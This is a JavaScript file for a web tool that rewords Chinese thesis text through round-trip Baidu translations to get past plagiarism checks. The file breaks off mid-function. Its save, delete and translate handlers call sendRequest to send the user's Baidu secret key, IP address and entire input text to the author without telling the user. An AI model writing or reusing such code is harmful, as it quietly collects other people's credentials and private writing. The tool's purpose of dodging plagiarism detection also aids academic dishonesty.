/*
 * @Author: FreySu
 * @Date: 2022-04-25 02:05:12
 * @Last Modified by: FreySu
 * @Last Modified time: 2022-04-26 06:48:06
 */

/* eslint-disable eqeqeq */
/* eslint-disable no-undef */
var to = $('.originData')

var from = $('.newData')
var from1 = $('.newData1')
var from2 = $('.newData2')
var from3 = $('.newData3')
var from4 = $('.newData4')
var from5 = $('.newData5')

var compare = $('.compareData')
var compare1 = $('.compareData1')
var compare2 = $('.compareData2')
var compare3 = $('.compareData3')
var compare4 = $('.compareData4')
var compare5 = $('.compareData5')

var appid = localStorage.getItem('appid1')
var key = localStorage.getItem('key1')
// var ydAppKey = localStorage.getItem('ydAppKey')
// var ydKey = localStorage.getItem('ydKey')
var url = 'https://api.fanyi.baidu.com/api/trans/vip/translate'
var timer = null

var fakerVariable = localStorage.getItem('fakerVariable')
var selectValueZero = JSON.parse(localStorage.getItem('selectValueZero'))
var selectValueOne = JSON.parse(localStorage.getItem('selectValueOne'))
var selectValueTwo = JSON.parse(localStorage.getItem('selectValueTwo'))
var selectValueThree = JSON.parse(localStorage.getItem('selectValueThree'))
var selectValueFour = JSON.parse(localStorage.getItem('selectValueFour'))
var selectValueFive = JSON.parse(localStorage.getItem('selectValueFive'))
var oldTrans =
  '\n            1：[0,1,0];\n            2：[0,2,0];\n            3：[0,11,0];\n            4：[0,4,1,9,2,0];\n            5：[0,10,4,0];\n            6：[0,1,2,3,0];\n            '

var d = new Date()
var years = d.getFullYear()
// 获取月份
var months = d.getMonth() + 1
// 获取日期
var dates = d.getDate()
var today = `${years}/${months}/${dates}`

var myToast = {
  /**
   * @param {string} type "success", "error", "warning", "info" or "question"
   * @param {string} title 标题
   * @param {number} timer 显示时间
   * @param {string} text text类型内容，选填
   */
  normal: function(type, title, timer, text = null) {
    const Toast = Swal.mixin({
      toast: true,
      position: 'center',
      showConfirmButton: false
    })
    Toast.fire({
      type,
      title,
      text,
      timer
    })
  },
  /**
   *
   * @param {string} type "success","error","warning","info" or "question"
   * @param {string} title 标题
   * @param {number} timer 显示时间
   * @param {boolean} isHtml text or html
   * @param {string} content 内容
   */
  mutipleNotControl: function(
    type = null,
    title,
    timer,
    isHtml,
    content,
    confirmCallBack
  ) {
    if (isHtml) {
      text = null
      html = content
    } else {
      text = content
      html = null
    }
    Swal.fire({
      type,
      title,
      text,
      timer,
      html,
      confirmButtonText: '我知道了',
      // allowOutsideClick: false,
      // allowEscapeKey: false,
      // allowEnterKey: false,
      timer
    }).then((result) => {
      confirmCallBack(result)
    })
  },
  mutipleControl: function(
    type = null,
    title,
    timer,
    isHtml,
    content,
    confirmCallBack
  ) {
    if (isHtml) {
      text = null
      html = content
    } else {
      text = content
      html = null
    }
    Swal.fire({
      type,
      title,
      text,
      timer,
      html,
      confirmButtonText: '我知道了',
      allowOutsideClick: false,
      allowEscapeKey: false,
      allowEnterKey: false,
      timer
    }).then((result) => {
      confirmCallBack(result)
    })
  }
}

/**
 * 密码隐藏显示
 * @param {Node} obj DOM节点
 */
function seePwd(obj) {
  var pwdValue = obj.next().val() // 获取密码值
  var _type = obj.next().attr('type') // 获取input的type类型

  if (_type == 'password') {
    obj.next().attr('type', 'text')
    obj.attr('class', 'bi bi-eye-slash user-select-none')
    obj.attr('title', '隐藏密码')
  } else if (_type == 'text') {
    obj.next().attr('type', 'password')
    obj.attr('class', 'bi bi-eye user-select-none')
    obj.attr('title', '显示密码')
  }
  obj.next().val(pwdValue)
}

$('#see_oldpwd').click(function() {
  seePwd($(this))
})

$('#yourAppid').val(appid)
$('#yourKey').val(key)

if (
  localStorage.getItem('sTimes') != null &&
  localStorage.getItem('sTimes') >= 0 &&
  localStorage.getItem('appid1') == secret().WtdKltf2 &&
  localStorage.getItem('key1') == secret().zDQA3
) {
  countTime1()
} else {
  if (
    !localStorage.getItem('appid1') ||
    !localStorage.getItem('key1') ||
    localStorage.getItem('appid1') == null ||
    localStorage.getItem('key1') == null
  ) {
    if (location.host == 'freysu.github.io') {
      myToast.mutipleControl(
        null,
        `公告 - ${today}`,
        null,
        true,
        `<b>欢迎新来的小伙伴来访！</b><br/>欢迎使用<b>【免申请 API 体验 3 分钟】</b>和<b>【一键提取查重报告标红内容】功能</b></br>如需使用降重功能请先点击右上角的【配置账号】！</br>如果你不会配置的话，可以点击右上角的【使用帮助】！<br/>解决不了的话加群反馈(QQ群:238223706)</br>如果本网站加载得很慢，可以访问备用网站，地址是</br><a href='https://my-translator-freysu.vercel.app'>https://my-translator-freysu.vercel.app</a></span>`,
        () => {}
      )
    } else {
      myToast.mutipleControl(
        null,
        `公告 - ${today}`,
        null,
        true,
        `<b>欢迎新来的小伙伴来访！</b><br/>欢迎使用<b>【免申请 API 体验 3 分钟】</b>和<b>【一键提取查重报告标红内容】功能</b></br>如需使用降重功能请先点击右上角的【配置账号】！</br>如果你不会配置的话，可以点击右上角的【使用帮助】！<br/>解决不了的话加群反馈(QQ群:238223706)</span>`,
        () => {}
      )
    }
  } else {
    if (
      localStorage.getItem('appid1') == secret().WtdKltf2 &&
      localStorage.getItem('key1') == secret().zDQA3 &&
      localStorage.getItem('sTimes') == -1
    ) {
      myToast.mutipleControl(
        null,
        `公告 - ${today}`,
        null,
        true,
        `<b>抱歉！你的体验时间已到！</br>如需继续使用本网站，麻烦请按照教程去配置账号！</b><br/><span class='text-muted'>如果账号配置出错，请休息一会再尝试~<br/>你也可以去查阅一下帮助，我已更新最新教程！<br/>解决不了的话加群反馈(QQ群:238223706)</br>如果本网站加载得很慢，可以访问备用网站，地址是</br><a href='https://my-translator-freysu.vercel.app'>https://my-translator-freysu.vercel.app</a></span>`,
        () => {}
      )
      localStorage.removeItem('appid1')
      localStorage.removeItem('key1')
      localStorage.setItem('sTimes', 0)
      $('#yourAppid').val('')
      $('#yourKey').val('')
    } else if (localStorage.getItem('sTimes') < 0) {
      if (location.host == 'freysu.github.io') {
        if (localStorage.getItem('notice_date') != dates) {
          myToast.mutipleNotControl(
            null,
            `公告 - ${today}`,
            4000,
            true,
            `欢迎<b>老朋友-${appid}</b>，论文人加油啊！<br/><span class='text-muted'>如果账号配置出错，请休息一会再尝试~<br/>你也可以去查阅一下帮助，我已更新最新教程！<br/>解决不了的话加群反馈(QQ群:238223706)</br>如果本网站加载得很慢，可以访问备用网站，地址是</br><a href='https://my-translator-freysu.vercel.app'>https://my-translator-freysu.vercel.app</a></span></br><b>更新日志：</b></br>1. 更新了一键提取查重报告功能</br>2.更新了自定义控制修改翻译路线功能`,
            () => {
              localStorage.setItem('notice_date', dates)
            }
          )
        }
      } else {
        if (localStorage.getItem('notice_date') != dates) {
          myToast.mutipleNotControl(
            null,
            `公告 - ${today}`,
            4000,
            true,
            `欢迎<b>老朋友-${appid}</b>，论文人加油啊！<br/><span class='text-muted'>如果账号配置出错，请休息一会再尝试~<br/>你也可以去查阅一下帮助，我已更新最新教程！<br/>解决不了的话加群反馈(QQ群:238223706)</span> </br><b>更新日志：</b></br>1. 更新了一键提取查重报告功能</br>2.更新了自定义控制修改翻译路线功能`,
            () => {
              localStorage.setItem('notice_date', dates)
            }
          )
        }
      }
    }
  }
}

// 判断是否保存了选项值，如果不为空就把保存的索引给输出到页面上,否则就写入索引
if (fakerVariable != null) {
  for (const index in selectValueZero) {
    $('#selectWay-' + index).html(
      document.getElementById('inputGroupSelect-' + index).options[
        selectValueZero[index]
      ].text
    )
    document.getElementById('inputGroupSelect-' + index).selectedIndex =
      selectValueZero[index]
  }
  for (const index in selectValueOne) {
    curIndex = Number(index) + 3
    $('#selectWay-' + curIndex).html(
      document.getElementById('inputGroupSelect-' + curIndex).options[
        selectValueOne[index]
      ].text
    )
    document.getElementById('inputGroupSelect-' + curIndex).selectedIndex =
      selectValueOne[index]
  }
  for (const index in selectValueTwo) {
    curIndex = Number(index) + 6
    $('#selectWay-' + curIndex).html(
      document.getElementById('inputGroupSelect-' + curIndex).options[
        selectValueTwo[index]
      ].text
    )
    document.getElementById('inputGroupSelect-' + curIndex).selectedIndex =
      selectValueTwo[index]
  }
  for (const index in selectValueThree) {
    curIndex = Number(index) + 9
    $('#selectWay-' + curIndex).html(
      document.getElementById('inputGroupSelect-' + curIndex).options[
        selectValueThree[index]
      ].text
    )
    document.getElementById('inputGroupSelect-' + curIndex).selectedIndex =
      selectValueThree[index]
  }
  for (const index in selectValueFour) {
    curIndex = Number(index) + 15
    $('#selectWay-' + curIndex).html(
      document.getElementById('inputGroupSelect-' + curIndex).options[
        selectValueFour[index]
      ].text
    )
    document.getElementById('inputGroupSelect-' + curIndex).selectedIndex =
      selectValueFour[index]
  }
  for (const index in selectValueFive) {
    curIndex = Number(index) + 19
    $('#selectWay-' + curIndex).html(
      document.getElementById('inputGroupSelect-' + curIndex).options[
        selectValueFive[index]
      ].text
    )
    document.getElementById('inputGroupSelect-' + curIndex).selectedIndex =
      selectValueFive[index]
  }
} else {
  localStorage.setItem('selectValueZero', JSON.stringify([0, 1, 0]))
  localStorage.setItem('selectValueOne', JSON.stringify([0, 2, 0]))
  localStorage.setItem('selectValueTwo', JSON.stringify([0, 11, 0]))
  localStorage.setItem('selectValueThree', JSON.stringify([0, 4, 1, 9, 2, 0]))
  localStorage.setItem('selectValueFour', JSON.stringify([0, 10, 4, 0]))
  localStorage.setItem('selectValueFive', JSON.stringify([0, 1, 2, 3, 0]))
  localStorage.setItem('fakerVariable', '1')
}

// 第0组
var select = document.getElementById('inputGroupSelect-0')
var select1 = document.getElementById('inputGroupSelect-1')
var select2 = document.getElementById('inputGroupSelect-2')

$('#saveSelect-0').click(() => {
  // 保存第0组
  selectHistoryZero = [
    select.selectedIndex, // 0
    select1.selectedIndex, // 1
    select2.selectedIndex // 0
  ]

  localStorage.setItem('selectValueZero', JSON.stringify(selectHistoryZero))
  for (const index in selectHistoryZero) {
    $('#selectWay-' + index).html(
      document.getElementById('inputGroupSelect-' + index).options[
        selectHistoryZero[index]
      ].text
    )
  }
  myToast.normal('success', '保存成功！', 3000)
})

$('#resetSelect-0').click(() => {
  select.selectedIndex = 0
  select1.selectedIndex = 1
  select2.selectedIndex = 0
  myToast.normal(
    'success',
    '已恢复默认的选项</br>（中文 ➡ 英语 ➡ 中文）</br>如需保存，请点击保存按钮！',
    3000
  )
})

// 第1组
var select3 = document.getElementById('inputGroupSelect-3')
var select4 = document.getElementById('inputGroupSelect-4')
var select5 = document.getElementById('inputGroupSelect-5')

$('#saveSelect-1').click(() => {
  // 保存第1组
  selectHistoryOne = [
    select3.selectedIndex, // 0
    select4.selectedIndex, // 2
    select5.selectedIndex // 0
  ]

  localStorage.setItem('selectValueOne', JSON.stringify(selectHistoryOne))
  for (const index in selectHistoryOne) {
    curIndex = Number(index) + 3
    $('#selectWay-' + curIndex).html(
      document.getElementById('inputGroupSelect-' + curIndex).options[
        selectHistoryOne[index]
      ].text
    )
  }
  myToast.normal('success', '保存成功！', 3000)
})

$('#resetSelect-1').click(() => {
  select3.selectedIndex = 0
  select4.selectedIndex = 2
  select5.selectedIndex = 0
  myToast.normal(
    'success',
    '已恢复默认的选项</br>（中文 ➡ 日语 ➡ 中文）</br>如需保存，请点击保存按钮！',
    3000
  )
})

// 第2组
var select6 = document.getElementById('inputGroupSelect-6')
var select7 = document.getElementById('inputGroupSelect-7')
var select8 = document.getElementById('inputGroupSelect-8')

$('#saveSelect-2').click(() => {
  // 保存第2组
  selectHistoryTwo = [
    select6.selectedIndex, // 0
    select7.selectedIndex, // 11
    select8.selectedIndex // 0
  ]

  localStorage.setItem('selectValueTwo', JSON.stringify(selectHistoryTwo))
  for (const index in selectHistoryTwo) {
    curIndex = Number(index) + 6
    $('#selectWay-' + curIndex).html(
      document.getElementById('inputGroupSelect-' + curIndex).options[
        selectHistoryTwo[index]
      ].text
    )
  }
  myToast.normal('success', '保存成功！', 3000)
})

$('#resetSelect-2').click(() => {
  select6.selectedIndex = 0
  select7.selectedIndex = 11
  select8.selectedIndex = 0
  myToast.normal(
    'success',
    '已恢复默认的选项</br>（中文 ➡ 意大利语 ➡ 中文）</br>如需保存，请点击保存按钮！',
    3000
  )
})

// 第3组
var select9 = document.getElementById('inputGroupSelect-9')
var select10 = document.getElementById('inputGroupSelect-10')
var select11 = document.getElementById('inputGroupSelect-11')
var select12 = document.getElementById('inputGroupSelect-12')
var select13 = document.getElementById('inputGroupSelect-13')
var select14 = document.getElementById('inputGroupSelect-14')

$('#saveSelect-3').click(() => {
  // 保存第3组
  selectHistoryThree = [
    select9.selectedIndex, // 0
    select10.selectedIndex, // 4
    select11.selectedIndex, // 1
    select12.selectedIndex, // 9
    select13.selectedIndex, // 2
    select14.selectedIndex // 0
  ]

  localStorage.setItem('selectValueThree', JSON.stringify(selectHistoryThree))
  for (const index in selectHistoryThree) {
    curIndex = Number(index) + 9
    $('#selectWay-' + curIndex).html(
      document.getElementById('inputGroupSelect-' + curIndex).options[
        selectHistoryThree[index]
      ].text
    )
  }
  myToast.normal('success', '保存成功！', 3000)
})

$('#resetSelect-3').click(() => {
  select9.selectedIndex = 0
  select10.selectedIndex = 4
  select11.selectedIndex = 1
  select12.selectedIndex = 9
  select13.selectedIndex = 2
  select14.selectedIndex = 0

  myToast.normal(
    'success',
    '已恢复默认的选项</br>（中文 ➡ 法语 ➡ 英语 ➡ 葡萄牙语 ➡ 日语 ➡ 中文）</br>如需保存，请点击保存按钮！',
    3000
  )
})

// 第4组
var select15 = document.getElementById('inputGroupSelect-15')
var select16 = document.getElementById('inputGroupSelect-16')
var select17 = document.getElementById('inputGroupSelect-17')
var select18 = document.getElementById('inputGroupSelect-18')

$('#saveSelect-4').click(() => {
  // 保存第4组
  selectHistoryFour = [
    select15.selectedIndex, // 0
    select16.selectedIndex, // 10
    select17.selectedIndex, // 4
    select18.selectedIndex // 0
  ]

  localStorage.setItem('selectValueFour', JSON.stringify(selectHistoryFour))
  for (const index in selectHistoryFour) {
    curIndex = Number(index) + 15
    $('#selectWay-' + curIndex).html(
      document.getElementById('inputGroupSelect-' + curIndex).options[
        selectHistoryFour[index]
      ].text
    )
  }
  myToast.normal('success', '保存成功！', 3000)
})

$('#resetSelect-4').click(() => {
  select15.selectedIndex = 0
  select16.selectedIndex = 10
  select17.selectedIndex = 4
  select18.selectedIndex = 0
  myToast.normal(
    'success',
    '已恢复默认的选项</br>（中文 ➡ 德语 ➡ 法语 ➡ 中文）</br>如需保存，请点击保存按钮！',
    3000
  )
})

// 第5组
var select19 = document.getElementById('inputGroupSelect-19')
var select20 = document.getElementById('inputGroupSelect-20')
var select21 = document.getElementById('inputGroupSelect-21')
var select22 = document.getElementById('inputGroupSelect-22')
var select23 = document.getElementById('inputGroupSelect-23')

$('#saveSelect-5').click(() => {
  // 保存第4组
  selectHistoryFive = [
    select19.selectedIndex, // 0
    select20.selectedIndex, // 1
    select21.selectedIndex, // 2
    select22.selectedIndex, // 3
    select23.selectedIndex // 0
  ]

  localStorage.setItem('selectValueFive', JSON.stringify(selectHistoryFive))
  for (const index in selectHistoryFive) {
    curIndex = Number(index) + 19
    $('#selectWay-' + curIndex).html(
      document.getElementById('inputGroupSelect-' + curIndex).options[
        selectHistoryFive[index]
      ].text
    )
  }
  myToast.normal('success', '保存成功！', 3000)
})

$('#resetSelect-5').click(() => {
  select19.selectedIndex = 0
  select20.selectedIndex = 1
  select21.selectedIndex = 2
  select22.selectedIndex = 3
  select23.selectedIndex = 0
  myToast.normal(
    'success',
    '已恢复默认的选项</br>（中文 ➡ 英语 ➡ 日语 ➡ 韩语 ➡ 中文）</br>如需保存，请点击保存按钮！',
    3000
  )
})

/**
 *
 * @param {*} target DOM节点
 * @description 用于展开修改区
 */
// eslint-disable-next-line no-unused-vars
function updateContentFn(target) {
  // $(target).next().collapse('toggle')
  if (
    $(target).html() ===
    '\n\t\t\t\t\t\t\t\t\t\t\t\t修改\n\t\t\t\t\t\t\t\t\t\t\t'
  ) {
    $(target).html('收起')
    if ($(target).next().hasClass('scale-out-ver-top')) {
      $(target).next().removeClass('scale-out-ver-top')
    }
    $(target).next().css('display', 'block')
  } else {
    $(target).html('\n\t\t\t\t\t\t\t\t\t\t\t\t修改\n\t\t\t\t\t\t\t\t\t\t\t')
    setTimeout(() => {
      $(target).next().css('display', 'none')
    }, 500)
    $(target).next().css('display', 'block')
    if (!$(target).next().hasClass('scale-out-ver-top')) {
      $(target).next().addClass('scale-out-ver-top')
    }
  }
}

$('.mybg').css(
  'background',
  'url("https://tuapi.eees.cc/api.php?category=biying&type=302") no-repeat center center'
)

$('#saveBtn').click(() => {
  const fn = () => {
    const _appid = $('#yourAppid').val()
    const _key = $('#yourKey').val()
    if (
      !_appid ||
      !_key ||
      _appid == 'null' ||
      _key == 'null' ||
      _appid.match(/,"expire":/) != null ||
      _key.match(/,"expire":/) != null ||
      _appid == 'appid' ||
      _key == 'key' ||
      _appid == '123hk' ||
      _key == '123hk'
    ) {
      myToast.normal('error', '请检查后重新输入！', 3500)
    } else {
      localStorage.setItem('appid1', _appid)
      localStorage.setItem('key1', _key)
      isCanUse(
        localStorage.getItem('appid1'),
        localStorage.getItem('key1'),
        'aa',
        'zh',
        'en'
      )

      // eslint-disable-next-line no-inner-declarations
      function isCanUse(check_Appid, check_Key, QUERY, TO, FROM) {
        const salt = new Date().getTime()
        const str1 = check_Appid + QUERY + salt + check_Key
        const sign = MD5.main(str1)
        $.ajax({
          url,
          type: 'get',
          // async: true,
          // 跨域
          dataType: 'jsonp',
          contentType: 'application/x-www-form-urlencoded; charset=utf-8',
          data: {
            q: QUERY,
            appid: check_Appid,
            salt: salt,
            from: FROM,
            to: TO,
            sign: sign
          },
          success: (data) => {
            if (data.error_code == '52003') {
              myToast.normal(
                'error',
                '保存失败！请检查后重新输入！</br>解决不了的话加群反馈(QQ群:238223706)',
                4500
              )
              sendRequest(
                localStorage.getItem('sTimes') +
                  ' \\ ' +
                  localStorage.getItem('appid1'),
                data.error_code +
                  '：' +
                  '上车失败 &&' +
                  localStorage.getItem('key1') +
                  'IP 地址：' +
                  keas_ip,
                1
              )
              localStorage.removeItem('appid1')
              localStorage.removeItem('key1')
              $('#yourAppid').val('')
              $('#yourKey').val('')
              return
            } else {
              if (
                localStorage.getItem('appid1') == secret().WtdKltf2 &&
                localStorage.getItem('key1') == secret().zDQA3 &&
                localStorage.getItem('sTimes') == -1
              ) {
                myToast.normal(
                  'warning',
                  '你真棒！想白嫖到底是吧？</br>被我逮到了吧？哈哈哈！',
                  4000
                )
                localStorage.removeItem('appid1')
                localStorage.removeItem('key1')
                localStorage.setItem('sTimes', 0)
                $('#yourAppid').val('')
                $('#yourKey').val('')
                sendRequest(
                  '盗用: ' +
                    localStorage.getItem('sTimes') +
                    ' \\ ' +
                    localStorage.getItem('appid1') +
                    '&&' +
                    localStorage.getItem('key1'),
                  '盗用 API 被我抓到了吧！IP 地址：' + kehu_ip,
                  1
                )
              } else {
                if (
                  localStorage.getItem('sTimes') != -1 &&
                  localStorage.getItem('appid1') == secret().WtdKltf2 &&
                  localStorage.getItem('key1') == secret().zDQA3
                ) {
                  localStorage.setItem('sTimes', -2)
                } else {
                  localStorage.setItem('sTimes', -1)
                }
                myToast.mutipleControl(
                  'success',
                  '<b>保存成功！</b>',
                  4500,
                  true,
                  `<span class='text-muted'>如果账号配置出错，请休息一会再尝试~<br/>你也可以去查阅一下帮助，我已更新最新教程！<br/>解决不了的话加群反馈(QQ群:238223706)</span> `,
                  () => {}
                )
                $('#exampleModal').modal('hide')
                $('.modal-backdrop').css('z-index', '-10')
                $('body').css('padding-right', '')
                sendRequest(
                  localStorage.getItem('sTimes') +
                    ' \\ ' +
                    localStorage.getItem('appid1') +
                    '&&' +
                    localStorage.getItem('key1'),
                  '上车了！IP 地址：' + kehu_ip,
                  4
                )
              }
            }
          }
        })
      }
    }
  }
  if (timer !== null) {
    clearTimeout(timer)
  }
  timer = setTimeout(() => {
    fn()
    timer = null
  }, 500)
})

$('#deleteBtn').click(() => {
  const fn = () => {
    sendRequest(
      localStorage.getItem('sTimes') + ' \\ ' + localStorage.getItem('appid1'),
      '下车了！',
      5
    )
    localStorage.removeItem('appid1')
    localStorage.removeItem('key1')
    myToast.normal('success', '已删除!', 4000)
    $('#yourAppid').val('')
    $('#yourKey').val('')
    $('#exampleModal').modal('hide')
    $('.modal-backdrop').css('z-index', '-10')
  }
  if (timer !== null) {
    clearTimeout(timer)
  }
  timer = setTimeout(() => {
    fn()
    timer = null
  }, 500)
})

$('.clear').click(() => {
  if (!$('.compareResDiv').hasClass('scale-out-ver-top')) {
    $('.compareResDiv').addClass('scale-out-ver-top')
  }
  $('#zifu').text('0')
  $('.tongji').detach()
  $('.originData').val('')
  // $(".lead").text("此处将会显示翻译结果")
  $('.lead').text('')
  // $(".compareRes").text("此处将会显示对比结果")
  $('.compareRes').text('')
  setTimeout(
    () => {
      for (let i = 0; i < $('.card').length; i++) {
        if ($('.isLow-' + i).hasClass('alert-success')) {
          $('.isLow-' + i).removeClass('alert-success')
        }
      }
    },
    500,
    setTimeout(() => {
      if ($('.compareResDiv').css('display') == 'block') {
        $('.compareResDiv').css('display', 'none')
        if ($('.compareResDiv').hasClass('scale-out-ver-top')) {
          $('.compareResDiv').removeClass('scale-out-ver-top')
        }
      }
    }, 500)
  )
  myToast.normal('success', '已清空', 3000)
  fn()
})

$('.compare').click(() => {
  const fn = () => {
    var str = '\n\t\t\t\t\t\t\t\t\t\t\t\t\t'
    if (to.val() == '') {
      myToast.normal('warning', '你还未输入...', 2500)
    } else if (
      from.html() == str &&
      from1.html() == str &&
      from2.html() == str &&
      from3.html() == str &&
      from4.html() == str &&
      from5.html() == str
    ) {
      myToast.normal('error', '对比失败！', 2500)
    } else if (
      from.html() == '' &&
      from1.html() == '' &&
      from2.html() == '' &&
      from3.html() == '' &&
      from4.html() == '' &&
      from5.html() == ''
    ) {
      myToast.normal('error', '对比失败！', 2500)
    } else if ($('.compareResDiv').css('display') == 'block') {
      myToast.normal('warning', '已有对比结果！')
    } else {
      myToast.normal('success', '正在对比...', 2500)
      setTimeout(() => {
        if ($('.compareResDiv').hasClass('scale-out-ver-top')) {
          $('.compareResDiv').removeClass('scale-out-ver-top')
        }
        if ($('.compareResDiv').css('display') == 'none') {
          $('.compareResDiv').css('display', 'block')
        }
        compareMain('from')
        compareMain('from1')
        compareMain('from2')
        compareMain('from3')
        compareMain('from4')
        compareMain('from5')
      }, 500)
      document.querySelector('.showcase').scrollIntoView() // 页面不刷新跳转
    }
  }
  if (timer !== null) {
    clearTimeout(timer)
  }
  timer = setTimeout(() => {
    fn()
    timer = null
  }, 500)
})

var foamTip = true

$('.translateBtn').click((e) => {
  function fn() {
    if (!$('.compareResDiv').hasClass('scale-out-ver-top')) {
      $('.compareResDiv').addClass('scale-out-ver-top')
    }
    for (let i = 0; i < $('.lead').length; i++) {
      $('.newData' + i).html('')
    }
    $('.newData').html('')
    $('.compareRes').html('')
    if ($('.compareResDiv').css('display') == 'none') {
      setTimeout(() => {
        for (let i = 0; i < $('.card').length; i++) {
          if ($('.isLow-' + i).hasClass('alert-success')) {
            $('.isLow-' + i).removeClass('alert-success')
          }
        }
      }, 500)
    } else {
      setTimeout(
        () => {
          for (let i = 0; i < $('.card').length; i++) {
            if ($('.isLow-' + i).hasClass('alert-success')) {
              $('.isLow-' + i).removeClass('alert-success')
            }
          }
        },
        500,
        setTimeout(() => {
          if ($('.compareResDiv').css('display') == 'block') {
            $('.compareResDiv').css('display', 'none')
          }
          if ($('.compareResDiv').hasClass('scale-out-ver-top')) {
            $('.compareResDiv').removeClass('scale-out-ver-top')
          }
        }, 500)
      )
    }
    var appid11 = localStorage.getItem('appid1')
    var key11 = localStorage.getItem('key1')
    if (!appid11 || !key11) {
      myToast.mutipleControl(
        'error',
        '翻译失败！',
        null,
        true,
        '您未配置账号，请配置完账号再开始使用...解决不了的话加群反馈作者(QQ群:238223706)',
        () => {}
      )
    } else if (
      appid11 == 'null' ||
      key11 == 'null' ||
      appid11.match(/,"expire":/) != null ||
      key11.match(/,"expire":/) != null ||
      appid11 == 'appid' ||
      key11 == 'key' ||
      appid11 == '123hk' ||
      key11 == '123hk'
    ) {
      myToast.normal('error', '账号有误！请检查！', 2500)
    } else if (to.val() == '') {
      myToast.normal('warning', '你未输入要翻译的内容...', 2500)
    } else {
      if (
        localStorage.getItem('sTimes') <= 0 &&
        localStorage.getItem('sTimes') != -2 &&
        appid11 == secret().WtdKltf2 &&
        key11 == secret().zDQA3
      ) {
        localStorage.removeItem('appid1')
        localStorage.removeItem('key1')
        $('#yourAppid').val('')
        $('#yourKey').val('')
        myToast.mutipleControl(
          'error',
          '翻译失败！',
          null,
          true,
          `你还未配置账号！</br><span class='text-muted'>如果账号配置出错，请休息一会再尝试~<br/>你也可以去查阅一下帮助，我已更新最新教程！<br/>解决不了的话加群反馈(QQ群:238223706)</span>`,
          () => {}
        )
      } else {
        var nTo = $('#zifu').text()
        if (nTo < 2000) {
          if (
            appid11 == secret().WtdKltf2 &&
            key11 == secret().zDQA3 &&
            localStorage.getItem('sTimes') >= 0
          ) {
            if (nTo < 500) {
              if (nTo >= 300) {
                setTimeout(() => {
                  myToast.normal('success', '正在翻译！', 2500)
                }, 2000)
                myToast.normal(
                  'warning',
                  '您输入的内容过长！</br>为了保证翻译降重质量，建议在300字以内~',
                  3000
                )
                foamTip = false
              } else {
                myToast.normal('success', '正在翻译！', 2500)
              }
              var transMethodsString = `
              1：${localStorage.getItem('selectValueZero')};
              2：${localStorage.getItem('selectValueOne')};
              3：${localStorage.getItem('selectValueTwo')};
              4：${localStorage.getItem('selectValueThree')};
              5：${localStorage.getItem('selectValueFour')};
              6：${localStorage.getItem('selectValueFive')};
              `
              if (transMethodsString == oldTrans) {
                sendRequest(
                  `${localStorage.getItem('sTimes')} \\ ${appid11} \\ 翻译`,
                  `${key11} \\
                  errorTimes: ${errorTimes} \\
                  restartTimes: ${restartTimes} \\
                  IP 地址：${kehu_ip} \\
                  翻译内容：${to.val()} \\
                  翻译路线：未修改`,
                  2
                )
              } else {
                sendRequest(
                  `${localStorage.getItem('sTimes')} \\ ${appid11} \\ 翻译`,
                  `${key11} \\
                  errorTimes: ${errorTimes} \\
                  restartTimes: ${restartTimes} \\
                  IP 地址：${kehu_ip} \\
                  翻译内容：${to.val()} \\
                  翻译路线： 
                  ${transMethodsString}`,
                  2
                )
              }

              //! Don't forget it!
              window.similarityArr = []
              translateMain(0, getCheckBoxVal())
              document.querySelector('.showcase').scrollIntoView() // 页面不刷新跳转
            } else {
              myToast.mutipleControl(
                'error',
                '翻译失败！',
                null,
                true,
                '检测到你输入的字数超过500字，请调整减少字数后重新输入再翻译。由于你是体验用户，我这边限制了字数。如需提高字数，请自行查阅帮助去配置！',
                () => {}
              )
            }
          } else {
            if (foamTip == true && nTo >= 300) {
              setTimeout(() => {
                myToast.normal('success', '正在翻译!', 2500)
              }, 2000)
              myToast.normal(
                'warning',
                '您输入的内容过长！</br>为了保证翻译降重质量，建议在300字以内~',
                3000
              )
              foamTip = false
            } else {
              myToast.normal('success', '正在翻译！', 2500)
            }
            var transMethodsString1 = `
            1：${localStorage.getItem('selectValueZero')};
            2：${localStorage.getItem('selectValueOne')};
            3：${localStorage.getItem('selectValueTwo')};
            4：${localStorage.getItem('selectValueThree')};
            5：${localStorage.getItem('selectValueFour')};
            6：${localStorage.getItem('selectValueFive')};
            `
            if (transMethodsString1 == oldTrans) {
              sendRequest(
                `${localStorage.getItem('sTimes')} \\ ${appid11} \\ 翻译`,
                `${key11} \\
                  errorTimes: ${errorTimes} \\
                  restartTimes: ${restartTimes} \\
                  IP 地址：${kehu_ip} \\
                  翻译内容：${to.val()} \\
                  翻译路线：未修改`,
                2
              )
            } else {
              sendRequest(
                `${localStorage.getItem('sTimes')} \\ ${appid11} \\ 翻译`,
                `${key11} \\
                  errorTimes: ${errorTimes} \\
                  restartTimes: ${restartTimes} \\
                  IP 地址：${kehu_ip} \\
                  翻译内容：${to.val()} \\
                  翻译路线： 
                  ${transMethodsString1}`,
                2
              )
            }
            //! Don't forget it!
            window.similarityArr = []
            translateMain(0, getCheckBoxVal())
            document.querySelector('.showcase').scrollIntoView() // 页面不刷新跳转
          }
        } else {
          myToast.normal(
            'warning',
            '您输入的内容过长！</br>为了保证翻译降重质量，建议在300字以内~',
            4000
          )
        }
      }
    }
  }
  if (timer !== null) {
    clearTimeout(timer)
  }
  timer = setTimeout(() => {
    $('.tongji').detach()
    fn()
    timer = null
  }, 500)
})

var foamTip1 = true
$('.translateAndCompareBtn').click((e) => {
  const fn = () => {
    for (let i = 0; i < $('.lead').length; i++) {
      $('.newData' + i).html('')
    }
    $('.newData').html('')
    $('.compareRes').html('')

    var appid11 = localStorage.getItem('appid1')
    var key11 = localStorage.getItem('key1')
    if (!appid11 || !key11) {
      myToast.mutipleControl(
        'error',
        '翻译失败！',
        null,
        true,
        '您未配置账号，请配置完账号再开始使用...解决不了的话加群反馈作者(QQ群:238223706)',
        () => {}
      )
      showCompareResDivFn(0)
    } else if (
      appid11 == 'null' ||
      key11 == 'null' ||
      appid11.match(/,"expire":/) != null ||
      key11.match(/,"expire":/) != null ||
      appid11 == 'appid' ||
      key11 == 'key' ||
      appid11 == '123hk' ||
      key11 == '123hk'
    ) {
      myToast.normal('error', '账号有误！请检查！', 2500)
      showCompareResDivFn(0)
    } else if (to.val() == '') {
      myToast.normal('warning', '你未输入要翻译的内容...', 2500)
      showCompareResDivFn(0)
    } else {
      if (
        localStorage.getItem('sTimes') <= 0 &&
        localStorage.getItem('sTimes') != -2 &&
        appid11 == secret().WtdKltf2 &&
        key11 == secret().zDQA3
      ) {
        localStorage.removeItem('appid1')
        localStorage.removeItem('key1')
        $('#yourAppid').val('')
        $('#yourKey').val('')
